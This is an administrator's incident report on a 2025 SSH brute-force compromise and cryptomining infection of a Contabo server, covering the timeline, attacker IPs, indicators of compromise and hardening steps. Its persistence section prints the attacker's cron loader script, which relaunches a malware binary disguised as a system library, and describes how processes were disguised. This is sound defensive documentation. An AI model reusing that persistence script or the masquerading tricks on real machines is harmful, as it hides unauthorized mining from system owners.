# Security Incident Report: Cryptocurrency Mining Malware Breach

**Server:** leadingai004.contaboserver.net (66.94.121.10)

**Incident Date:** November 12-13, 2025

**Report Date:** November 13, 2025

**Reported By:** Server Administrator

**Severity:** High - Full root compromise with persistent malware

---

## Executive Summary

On November 13, 2025 at approximately 19:05 CET, the server experienced severe performance degradation manifesting as system freezes and unresponsive services. Investigation revealed a successful SSH brute-force attack on November 12, 2025 at 13:55 CET, resulting in unauthorized root access and deployment of cryptocurrency mining malware. The breach was contained, malware removed, and security hardening implemented within 90 minutes of detection.

**Impact:**

- Server compromised for approximately 29 hours
- CPU resources consumed for cryptocurrency mining
- Service availability degraded
- No evidence of data exfiltration or lateral movement to Docker containers

**Status:** Resolved - All malware removed, vulnerabilities patched, enhanced monitoring implemented

---

## Incident Timeline

### Initial Compromise

**Date/Time:** November 12, 2025, 13:55:51 CET

| Time (CET) | Event |
| --- | --- |
| 00:00-13:55 | Sustained SSH brute-force attack from multiple IPs (129.212.188.186, 77.192.248.233, 115.190.77.238, 103.126.161.213, 46.101.222.112) |
| 13:55:51 | Successful password authentication: root from 193.46.255.33 |
| 13:55:59 | Second successful login: root from 23.160.56.21 |
| 13:56:01 | Crontab modification detected (system reload) |
| 13:57:01 | First execution of malicious cron job `/etc/cron.hourly/gcc.sh` |
| 14:24:18 | Additional successful login: root from 193.46.255.244 |
| 14:24:26 | Additional successful login: root from 23.160.56.118 |

### Malware Activity Period

**Duration:** November 12, 2025 13:57 CET - November 13, 2025 19:35 CET (approximately 29 hours)

- Malicious cron job executed every 3 minutes
- Multiple cryptocurrency mining processes spawned
- Processes disguised with common command names (cat, pwd, sh, who)
- CPU utilization: 200-300% sustained
- Multiple persistence mechanisms deployed

### Detection and Response

**Date/Time:** November 13, 2025, 19:05-20:45 CET

| Time (CET) | Action |
| --- | --- |
| 19:05 | Administrator reports system freezes and unresponsive services |
| 19:10 | Initial system analysis reveals suspicious high-CPU process (PID 718: ygljglk+, 250% CPU) |
| 19:15 | Malicious cron job identified in `/etc/crontab` |
| 19:28 | Multiple reboot attempts; malware auto-reinstalling |
| 19:35 | Successful removal of malware binaries and cron jobs |
| 19:35 | Files locked with immutable attribute (chattr +i) |
| 19:37 | Fail2ban installed and configured |
| 19:38 | BT-Panel (aaPanel) removed as potential vulnerability vector |
| 19:41 | Essential services restored |
| 19:45 | UFW firewall configured and enabled |
| 20:00 | Security hardening completed |

---

## Technical Analysis

### Attack Vector

**Method:** SSH brute-force attack with successful password authentication

**Vulnerability Exploited:**

- SSH password authentication enabled (should have been key-only)
- No rate limiting or IP blocking mechanism (fail2ban not installed)
- Weak or compromised root password
- Port 22 exposed to internet without additional protection

### Malware Components Identified

### 1. Malicious Binaries

- `/usr/bin/ygljglkjgfg0` - Primary cryptominer executable
- `/lib/libudev.so` - Fake library file (malware binary)
- `/lib/libudev.so.6` - Malware copy
- `/usr/bin/sdf3fslsdf15` - Additional malware component
- `/usr/bin/sdf3fslsdf13` - Additional malware component
- `/tmp/itkfhyetwo` - Temporary malware payload (548KB)

### 2. Persistence Mechanisms

- **Cron job:** `/etc/crontab` modified with entry: `/3 * * * * root /etc/cron.hourly/gcc.sh`
- **Malicious script:** `/etc/cron.hourly/gcc.sh` containing:

    ```bash
    #!/bin/sh
    PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
    for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do ifconfig $i up& done
    cp /lib/libudev.so /lib/libudev.so.6
    /lib/libudev.so.6
    ```

- **Systemd service:** `ygljglkjgfg0.service` configured for auto-start

### 3. Fake System Files

Decoy log files created to mimic Red Hat/CentOS systems:

- `/var/log/secure`
- `/var/log/firewalld`
- `/var/log/boot.log`
- `/var/log/messages`
- `/var/log/cron`
- `/var/log/maillog`
- `/var/log/yum.log`
- `/var/log/spooler`

### Malware Behavior

- **CPU consumption:** 200-300% sustained (multi-threaded mining)
- **Process masquerading:** Disguised as legitimate commands (cat, pwd, sh, who, nweptdq)
- **Auto-recovery:** Reinstalled itself every 3 minutes via cron
- **Network activity:** Likely communicating with mining pool (not captured)
- **Persistence:** Multiple redundant installation mechanisms

### Attacker Infrastructure

**Source IPs (confirmed malicious):**

- 193.46.255.33 (Netherlands) - Initial compromise
- 23.160.56.21 (United States) - Secondary access
- 193.46.255.244 (Netherlands) - Tertiary access
- 23.160.56.118 (United States) - Quaternary access

**Brute-force IPs (partial list):**

- 129.212.188.186
- 77.192.248.233
- 115.190.77.238
- 103.126.161.213
- 46.101.222.112
- 50.116.21.107
- 146.190.253.191
- 194.60.231.42
- 197.242.170.10
- 125.229.56.26
- 120.48.147.81

---

## Remediation Actions

### Immediate Response (Completed)

1. **Malware Removal**
    - Terminated all malicious processes
    - Removed malware binaries from `/usr/bin/`, `/lib/`, `/tmp/`
    - Deleted malicious cron jobs and scripts
    - Removed fake systemd services
    - Cleaned fake log files
    - Made critical files immutable: `chattr +i /etc/crontab /etc/cron.hourly/gcc.sh`
2. **System Hardening**
    - Changed root password to strong passphrase
    - Disabled SSH password authentication
    - Configured SSH to key-only authentication
    - Set PermitRootLogin to "prohibit-password"
    - Restarted SSH service
3. **Security Tools Installation**
    - Installed and configured fail2ban
    - Configured SSH jail with 3-attempt threshold, 24-hour ban
    - Permanently banned attacker IPs
    - Installed UFW firewall
    - Configured minimal firewall rules (SSH, HTTP, HTTPS, Tailscale only)
4. **Vulnerability Remediation**
    - Removed BT-Panel (aaPanel) - identified as potential attack vector
    - Disabled Cockpit web console (port 9090)
    - Closed unnecessary ports: 888, 33603, 9090, 20-21, 39000-40000
    - Updated all system packages
5. **Service Restoration**
    - Verified Docker containers integrity
    - Restarted essential services: Traefik, n8n, Neo4j, Supabase, Portainer, Filebrowser
    - Confirmed no malware in container environments
    - Validated service functionality

### Current Security Posture

**Active Protections:**

- ✅ SSH key-only authentication enforced
- ✅ Fail2ban monitoring SSH with automatic IP banning
- ✅ UFW firewall with minimal port exposure
- ✅ Critical system files protected with immutable flag
- ✅ All known malware removed and prevented from reinstalling
- ✅ System fully patched and updated
- ✅ BT-Panel vulnerability eliminated

**Monitoring Status:**

- Fail2ban: Active, 7 current failed attempts detected, 0 banned (post-remediation)
- Firewall: Active, 4 ports open (22, 80, 443, 41641)
- System load: Normal (0.37 average)
- Memory usage: Normal (2.3GB/11GB)
- No suspicious processes detected

---

## Post-Incident Analysis

### Root Cause

The compromise occurred due to **inadequate SSH access controls**, specifically:

1. Password authentication enabled on internet-facing SSH service
2. Absence of automated brute-force protection (fail2ban)
3. Potentially weak or compromised root password
4. No rate limiting on authentication attempts

### Attack Classification

- **Type:** Automated opportunistic attack (cryptojacking)
- **Sophistication:** Medium - automated deployment, multiple persistence mechanisms
- **Motivation:** Financial gain through cryptocurrency mining
- **Targeting:** Non-targeted; automated scanning and exploitation

### Estimated Impact

- **Duration of compromise:** ~29 hours
- **Data breach:** No evidence of data exfiltration
- **Service impact:** Degraded performance, intermittent service unavailability
- **Financial impact:** Minimal (<$2 estimated attacker profit, electricity costs, potential Contabo overage charges)
- **Reputational impact:** None (no customer-facing services compromised)

### What Was NOT Compromised

- Docker containers and their data
- Application databases (Neo4j, Supabase, PostgreSQL)
- User data or credentials
- SSL certificates or private keys
- Tailscale network access
- Application configurations

---

## Recommendations

### Completed (Immediate)

- [x]  Disable SSH password authentication
- [x]  Implement fail2ban with aggressive SSH protection
- [x]  Deploy UFW firewall with minimal port exposure
- [x]  Remove BT-Panel vulnerability
- [x]  Update all system packages
- [x]  Change root password
- [x]  Lock critical system files

### Short-term (Next 7 days)

- [ ]  Configure Traefik authentication for exposed services (n8n, Portainer, Neo4j)
- [ ]  Implement SSL certificates via Let's Encrypt if not already configured
- [ ]  Review and secure Docker container port exposure
- [ ]  Configure centralized logging (syslog forwarding or log aggregation)
- [ ]  Implement automated security updates
- [ ]  Document all legitimate SSH keys and remove any unknown keys

### Medium-term (Next 30 days)

- [ ]  Implement intrusion detection system (AIDE, Tripwire, or similar)
- [ ]  Set up automated backups with off-site storage
- [ ]  Configure monitoring and alerting (CPU usage, failed logins, file changes)
- [ ]  Conduct security audit of all Docker containers
- [ ]  Review and minimize running services
- [ ]  Implement SSH key rotation policy
- [ ]  Consider moving SSH to non-standard port or behind VPN

### Long-term (Ongoing)

- [ ]  Regular security audits (quarterly)
- [ ]  Penetration testing (annual)
- [ ]  Security patch management process
- [ ]  Incident response plan documentation
- [ ]  Disaster recovery testing
- [ ]  Consider implementing SELinux or AppArmor
- [ ]  Evaluate moving critical services behind Tailscale VPN exclusively

---

## Lessons Learned

### What Went Well

1. **Rapid detection:** Performance degradation was noticed quickly
2. **Effective response:** Malware removed within 90 minutes of detection
3. **Minimal damage:** No data loss or exfiltration
4. **Service continuity:** All services restored successfully
5. **Comprehensive hardening:** Multiple security layers implemented

### What Could Be Improved

1. **Preventative controls:** Should have had fail2ban and key-only SSH from deployment
2. **Monitoring:** No alerting for high CPU usage or failed login attempts
3. **Attack surface:** Unnecessary services (BT-Panel, Cockpit) were exposed
4. **Password policy:** Root password was vulnerable to brute-force
5. **Documentation:** No incident response plan was in place

### Key Takeaways

1. **Defense in depth is critical:** Single point of failure (SSH password) led to full compromise
2. **Automated attacks are constant:** Internet-facing services are under continuous attack
3. **Security by default:** New servers should be hardened before exposing to internet
4. **Monitoring is essential:** Earlier detection could have prevented 29 hours of compromise
5. **Least privilege:** Services should not run as root; Docker containers should be isolated

---

## Appendices

### Appendix A: Fail2ban Configuration

```
[DEFAULT]
bantime = 86400
findtime = 600
maxretry = 3

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
```

### Appendix B: UFW Firewall Rules

```
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
443/tcp                    ALLOW       Anywhere
41641/udp                  ALLOW       Anywhere
```

### Appendix C: SSH Hardening Configuration

```
PasswordAuthentication no
PermitRootLogin prohibit-password
PubkeyAuthentication yes
```

### Appendix D: Malware IOCs (Indicators of Compromise)

**File Hashes (if available for threat intelligence):**

- Not captured during incident response

**File Paths:**

- `/usr/bin/ygljglkjgfg0`
- `/lib/libudev.so` (malicious)
- `/lib/libudev.so.6`
- `/usr/bin/sdf3fslsdf15`
- `/usr/bin/sdf3fslsdf13`
- `/etc/cron.hourly/gcc.sh`
- `/tmp/itkfhyetwo`

**Process Names:**

- ygljglk*
- nweptdq*
- Disguised as: cat, pwd, sh, who

**Network IOCs:**

- Source IPs listed in "Attacker Infrastructure" section
- Mining pool connections (not captured)

---

## Approval and Distribution

**Prepared by:** System Administrator

**Date:** November 13, 2025

**Classification:** Internal Use Only

**Distribution List:**

- Server Administrator (primary)
- Management (if applicable)
- Security team (if applicable)

**Retention:** Retain for minimum 7 years per security incident policy

---

**Document Version:** 1.0

**Last Updated:** November 13, 2025, 20:45 CET
